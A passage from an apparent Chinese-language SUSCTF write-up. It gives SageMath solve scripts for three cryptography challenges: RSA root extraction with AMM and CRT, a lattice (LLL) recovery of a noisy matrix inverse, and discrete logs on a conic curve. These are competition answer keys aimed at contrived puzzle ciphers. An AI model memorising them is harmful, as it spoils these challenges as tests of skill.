<p>$$cq^{-e1 \times e3}\equiv{m^{e2}}\pmod{q} $$</p>
<p>对上面的式子使用amm算法，就可以得到mp、mq的列表，然后使用crt对其组合，用SUSCTF校验即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">c = <span class="number">2832775557487418816663494645849097066925967799754895979829784499040437385450603537732862576495758207240632734290947928291961063611897822688909447511260639429367768479378599532712621774918733304857247099714044615691877995534173849302353620399896455615474093581673774297730056975663792651743809514320379189748228186812362112753688073161375690508818356712739795492736743994105438575736577194329751372142329306630950863097761601196849158280502041616545429586870751042908365507050717385205371671658706357669408813112610215766159761927196639404951251535622349916877296956767883165696947955379829079278948514755758174884809479690995427980775293393456403529481055942899970158049070109142310832516606657100119207595631431023336544432679282722485978175459551109374822024850128128796213791820270973849303929674648894135672365776376696816104314090776423931007123128977218361110636927878232444348690591774581974226318856099862175526133892</span></span><br><span class="line">p = <span class="number">127846753573603084140032502367311687577517286192893830888210505400863747960458410091624928485398237221748639465569360357083610343901195273740653100259873512668015324620239720302434418836556626441491996755736644886234427063508445212117628827393696641594389475794455769831224080974098671804484986257952189021223</span></span><br><span class="line">q = <span class="number">145855456487495382044171198958191111759614682359121667762539436558951453420409098978730659224765186993202647878416602503196995715156477020462357271957894750950465766809623184979464111968346235929375202282811814079958258215558862385475337911665725569669510022344713444067774094112542265293776098223712339100693</span></span><br><span class="line">r = <span class="number">165967627827619421909025667485886197280531070386062799707570138462960892786375448755168117226002965841166040777799690060003514218907279202146293715568618421507166624010447447835500614000601643150187327886055136468260391127675012777934049855029499330117864969171026445847229725440665179150874362143944727374907</span></span><br><span class="line"><span class="comment"># fp = [2, 7, 757, 1709, 85015583 , 339028665499, 149105250954771885483776047]</span></span><br><span class="line"><span class="comment"># fq = [2, 3, 66553,81768440203, 84405986771, 38037107558208320033, 16137718604846030589135490851713]</span></span><br><span class="line"><span class="comment"># fr = [2, 5156273, 10012111, 11607389, 68872137169799749, 9691125310820433463]</span></span><br><span class="line"><span class="comment"># e_list = []</span></span><br><span class="line"><span class="comment"># for i in fp:</span></span><br><span class="line"><span class="comment">#     for j in fq:</span></span><br><span class="line"><span class="comment">#         for k in fr:</span></span><br><span class="line"><span class="comment">#             e_list.append(i*j*k)</span></span><br><span class="line"><span class="comment"># print(e)</span></span><br><span class="line">e = <span class="number">757</span> * <span class="number">66553</span> *<span class="number">5156273</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">o, r, q</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n----------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = - discrete_log(d, a)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c^r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllPRoot</span>(<span class="params">p, e</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(proot) &lt; e:</span><br><span class="line">        proot.add(<span class="built_in">pow</span>(random.randint(<span class="number">2</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllSolutions</span>(<span class="params">mp, proot, cp, p</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, cp, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line">n=p*q*r</span><br><span class="line"><span class="comment"># tmp = pow(int(1&lt;&lt;1024),int(e),n)</span></span><br><span class="line">tmp = <span class="number">2794203162952680694875426764547234241112236710433123774476303768639242351566319207612773628883250609134659396011750795113351981408956541443986997306105869563120160376511155383832592237253107342927670770094240045412123787825031261131955433947396826167219004667304636335427373984885928591487526163086731412269053200262557436796244981351739716063496342017497841802350338687039580076905949641402173299773716271511639533823663740291331408514189072329517625171120136705677613965360814741037067953490597466636290290725085921897578223035738383932219334876192857916281288629471625406358741715112812225419217748429901501082216480552255233899368763011103720695984389763743356559299690991047172680728215625377751497287365075742929734077041112027582350488222091280835389084342367259161290929159777553525296385682720359499417021854388648183468514374707670903349123145819166174953312125050648613697527164777642887701658900202492759171557250</span></span><br><span class="line">realc=inverse_mod(tmp,n)*c%n</span><br><span class="line">er=<span class="number">5156273</span></span><br><span class="line">der = inverse_mod(er,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>(realc), der,p*q)</span><br><span class="line">dp = inverse_mod(<span class="number">66553</span>, p-<span class="number">1</span>)</span><br><span class="line">dq = inverse_mod(<span class="number">757</span>, q-<span class="number">1</span>)</span><br><span class="line">cp = <span class="built_in">pow</span>(<span class="built_in">int</span>(c),<span class="built_in">int</span>(dp),<span class="built_in">int</span>(p))</span><br><span class="line">cq = <span class="built_in">pow</span>(<span class="built_in">int</span>(c),<span class="built_in">int</span>(dq),<span class="built_in">int</span>(q))</span><br><span class="line">mp = AMM(cp, <span class="number">757</span>, p)</span><br><span class="line">mq = AMM(cq, <span class="number">66553</span>, q)</span><br><span class="line">p_proot = findAllPRoot(p, <span class="number">757</span>)</span><br><span class="line">q_proot = findAllPRoot(q, <span class="number">66553</span>)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line">mqs = findAllSolutions(mq, q_proot, cq, q)</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Start CRT...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    <span class="built_in">print</span>(mpp)</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        solution = crt([<span class="built_in">int</span>(mpp), <span class="built_in">int</span>(mqq)], [p, q])</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;SUSCTF&#x27;</span> <span class="keyword">in</span> long_to_bytes(solution):</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(solution))</span><br><span class="line">            end = time.time()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br></pre></td></tr></table></figure>
<h2><span id="inverseproblem">InverseProblem</span><a href="#inverseproblem" class="header-anchor"></a></h2><p>小数矩阵乘法求逆，在这个过程中无论如何计算都会产生精度损失（做题过程中尝试了使用Rational域计算都没用），后来意识到也许可以用格来做，构造一个这样的格：<br><img src="./20220301005626248.jpg" alt="img"><br>其左边如果乘以flag构成的向量，那么得到的目标向量会是：$ (errors, flag) $，理想状态下，errors等于0，但是受到精度影响，errors不等于0，但是很小，同时flag也很小，因此可以达成目的。<br>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;&#x27;&#x27;3.657060500339054556e+02</span></span><br><span class="line"><span class="string">3.832239212422502419e+02</span></span><br><span class="line"><span class="string">4.006400878420690219e+02</span></span><br><span class="line"><span class="string">4.178419900792603698e+02</span></span><br><span class="line"><span class="string">4.347228858757071634e+02</span></span><br><span class="line"><span class="string">4.511847676148433948e+02</span></span><br><span class="line"><span class="string">4.671407458110251127e+02</span></span><br><span class="line"><span class="string">4.825167947918074560e+02</span></span><br><span class="line"><span class="string">4.972528090932780174e+02</span></span><br><span class="line"><span class="string">5.113029695817293714e+02</span></span><br><span class="line"><span class="string">5.246354631948004226e+02</span></span><br><span class="line"><span class="string">5.372316391653928349e+02</span></span><br><span class="line"><span class="string">5.490847173300799113e+02</span></span><br><span class="line"><span class="string">5.601981891814167511e+02</span></span><br><span class="line"><span class="string">5.705840667157972348e+02</span></span><br><span class="line"><span class="string">5.802611340293560716e+02</span></span><br><span class="line"><span class="string">5.892533389518160902e+02</span></span><br><span class="line"><span class="string">5.975884263745526823e+02</span></span><br><span class="line"><span class="string">6.052968650055386206e+02</span></span><br><span class="line"><span class="string">6.124110630374365201e+02</span></span><br><span class="line"><span class="string">6.189648165161182760e+02</span></span><br><span class="line"><span class="string">6.249928981118596312e+02</span></span><br><span class="line"><span class="string">6.305306816020913629e+02</span></span><br><span class="line"><span class="string">6.356137112146116124e+02</span></span><br><span class="line"><span class="string">6.402771610768811570e+02</span></span><br><span class="line"><span class="string">6.445551788138646998e+02</span></span><br><span class="line"><span class="string">6.484801562386791147e+02</span></span><br><span class="line"><span class="string">6.520820067831411961e+02</span></span><br><span class="line"><span class="string">6.553875449515115861e+02</span></span><br><span class="line"><span class="string">6.584200543535777115e+02</span></span><br><span class="line"><span class="string">6.611991006926840555e+02</span></span><br><span class="line"><span class="string">6.637406026122149569e+02</span></span><br><span class="line"><span class="string">6.660571276935107790e+02</span></span><br><span class="line"><span class="string">6.681583443270599219e+02</span></span><br><span class="line"><span class="string">6.700515409542964562e+02</span></span><br><span class="line"><span class="string">6.717421256877905762e+02</span></span><br><span class="line"><span class="string">6.732340393774057929e+02</span></span><br><span class="line"><span class="string">6.745300469406174670e+02</span></span><br><span class="line"><span class="string">6.756319058650934721e+02</span></span><br><span class="line"><span class="string">6.765404381911505425e+02</span></span><br><span class="line"><span class="string">6.772555468921494821e+02</span></span><br><span class="line"><span class="string">6.777762178159265432e+02</span></span><br><span class="line"><span class="string">6.781005372262200126e+02</span></span><br><span class="line"><span class="string">6.782257385537030814e+02</span></span><br><span class="line"><span class="string">6.781482768722584069e+02</span></span><br><span class="line"><span class="string">6.778639205835502253e+02</span></span><br><span class="line"><span class="string">6.773678481496929180e+02</span></span><br><span class="line"><span class="string">6.766547414782241958e+02</span></span><br><span class="line"><span class="string">6.757188729437999655e+02</span></span><br><span class="line"><span class="string">6.745541865153842309e+02</span></span><br><span class="line"><span class="string">6.731543734407333659e+02</span></span><br><span class="line"><span class="string">6.715129401333222177e+02</span></span><br><span class="line"><span class="string">6.696232624726493441e+02</span></span><br><span class="line"><span class="string">6.674786187460366591e+02</span></span><br><span class="line"><span class="string">6.650721936401939729e+02</span></span><br><span class="line"><span class="string">6.623970470419692447e+02</span></span><br><span class="line"><span class="string">6.594460419709976122e+02</span></span><br><span class="line"><span class="string">6.562117241643640000e+02</span></span><br><span class="line"><span class="string">6.526861416758931682e+02</span></span><br><span class="line"><span class="string">6.488605883801759546e+02</span></span><br><span class="line"><span class="string">6.447252539940367342e+02</span></span><br><span class="line"><span class="string">6.402687687915280321e+02</span></span><br><span class="line"><span class="string">6.354776457871529374e+02</span></span><br><span class="line"><span class="string">6.303356463148024886e+02</span></span><br><span class="line"><span class="string">6.248231231031890047e+02</span></span><br><span class="line"><span class="string">6.189164222318630664e+02</span></span><br><span class="line"><span class="string">6.125874450187269531e+02</span></span><br><span class="line"><span class="string">6.058034773416537746e+02</span></span><br><span class="line"><span class="string">5.985273843207024811e+02</span></span><br><span class="line"><span class="string">5.907182434535461653e+02</span></span><br><span class="line"><span class="string">5.823324532363482149e+02</span></span><br><span class="line"><span class="string">5.733253130130134423e+02</span></span><br><span class="line"><span class="string">5.636530294391988036e+02</span></span><br><span class="line"><span class="string">5.532750701442269019e+02</span></span><br><span class="line"><span class="string">5.421567579447032585e+02</span></span><br><span class="line"><span class="string">5.302719786604150158e+02</span></span><br><span class="line"><span class="string">5.176058598538473916e+02</span></span><br><span class="line"><span class="string">5.041572643016256734e+02</span></span><br><span class="line"><span class="string">4.899409301857818377e+02</span></span><br><span class="line"><span class="string">4.749890824218749685e+02</span></span><br><span class="line"><span class="string">4.593523418788242338e+02</span></span><br><span class="line"><span class="string">4.430997787892412703e+02</span></span><br><span class="line"><span class="string">4.263179996640761260e+02</span></span><br><span class="line"><span class="string">4.091092256773656004e+02</span></span><br><span class="line"><span class="string">3.915884105025300528e+02&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">b = b.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">b = [each[:-<span class="number">4</span>] <span class="keyword">for</span> each <span class="keyword">in</span> b]</span><br><span class="line">b = [<span class="built_in">int</span>(each.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> each <span class="keyword">in</span> b]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gravity</span>(<span class="params">n,d=<span class="number">0.25</span></span>):</span><br><span class="line">    A=np.zeros([n,n])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            A[i,j]=d/n*(d**<span class="number">2</span>+((i-j)/n)**<span class="number">2</span>)**(-<span class="number">1.5</span>)</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line">A = gravity(<span class="number">85</span>) * <span class="number">10</span>^<span class="number">18</span></span><br><span class="line">A = [[<span class="built_in">int</span>(each2) <span class="keyword">for</span> each2 <span class="keyword">in</span> each1] <span class="keyword">for</span> each1 <span class="keyword">in</span> A]</span><br><span class="line">M = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">85</span>):</span><br><span class="line">    M.append(A[i] + [<span class="number">0</span>] * i + [<span class="number">1</span>] + [<span class="number">0</span>] * (<span class="number">84</span> - i))</span><br><span class="line"></span><br><span class="line">M.append(b + [<span class="number">0</span>] * <span class="number">85</span>)</span><br><span class="line">M = Matrix(ZZ, M)</span><br><span class="line"></span><br><span class="line">L = M.LLL()</span><br><span class="line">ans = L[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ans[<span class="number">85</span>:]))</span><br></pre></td></tr></table></figure>
<h2><span id="specialcurve3">SpecialCurve3</span><a href="#specialcurve3" class="header-anchor"></a></h2><p>题目分成了三个部分，该曲线是过原点的圆锥曲线，a&gt;0时为双曲线，a&#x3D;0时为抛物线，a&lt;0时为椭圆，三个Problem分别对这三种情况进行了讨论。<br>最简单的是第二部分，根据加法公式，这种情况下的纵坐标与点的映射关系是线性的，即$(nG)_y&#x3D;2n*G_y$，可以立刻算出结果<br>其次是第三部分，虽然p很大，但是p+1光滑，且曲线的阶是p+1，可以直接使用bsgs算法结合crt算出结果。这里使用了sagemath中自带的bsgs（sage自带的bsgs算法有bug，文件&#x2F;opt&#x2F;sagemath-9.3&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;sage&#x2F;groups&#x2F;generic.py中468行没写全，这导致bsgs自定义群的计算报错，解决方案就是把这一行参数补全即可。<code>c = op(inverse(b), multiple(a, lb, operation=operation, identity=identity, inverse=inverse, op=op))</code>）<br>第一部分比较复杂，我参考了去年D^3CTF的做法，根据Pell方程的矩阵形式推导迭代公式，最终可以将点运算映射到GF(p)上的运算，再根据p-1的小因子，结合cado-nfs和bsgs算法计算出其余的解。这里的映射关系详见wp，推导方法与D^3一致，在结果上会有一个$(-1)^n$的差别，不过问题不大，正着解不出结果就取负解。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sage.groups.generic <span class="keyword">import</span> bsgs</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpecialCurve</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, p, a, b</span>):</span><br><span class="line">        <span class="variable language_">self</span>.p = p</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;SpecialCurve(<span class="subst">&#123;self.p&#125;</span>,<span class="subst">&#123;self.a&#125;</span>,<span class="subst">&#123;self.b&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="keyword">return</span> SpecialCurvePoint(<span class="variable language_">self</span>.p, <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, x, y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__contains__</span>(<span class="params">self, other</span>):</span><br><span class="line">        x, y = other.x, other.y</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.a * x ** <span class="number">2</span> - <span class="variable language_">self</span>.b * x - y ** <span class="number">2</span>) % <span class="variable language_">self</span>.p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpecialCurvePoint</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, p, a, b, x, y</span>):</span><br><span class="line">        <span class="variable language_">self</span>.p = p</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line">        <span class="variable language_">self</span>.x = x % p</span><br><span class="line">        <span class="variable language_">self</span>.y = y % p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(%d, %d)&quot;</span> % (<span class="variable language_">self</span>.x, <span class="variable language_">self</span>.y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(<span class="variable language_">self</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self, P1</span>):</span><br><span class="line">        x1, y1 = <span class="variable language_">self</span>.x, <span class="variable language_">self</span>.y</span><br><span class="line">        x2, y2 = P1.x, P1.y</span><br><span class="line">        <span class="keyword">if</span> x1 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> P1</span><br><span class="line">        <span class="keyword">elif</span> x2 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span></span><br><span class="line">        <span class="keyword">elif</span> x1 == x2 <span class="keyword">and</span> (y1+y2) % <span class="variable language_">self</span>.p == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> SpecialCurvePoint(<span class="variable language_">self</span>.p, <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span> == P1:</span><br><span class="line">            t = (<span class="number">2</span>*<span class="variable language_">self</span>.a*x1-<span class="variable 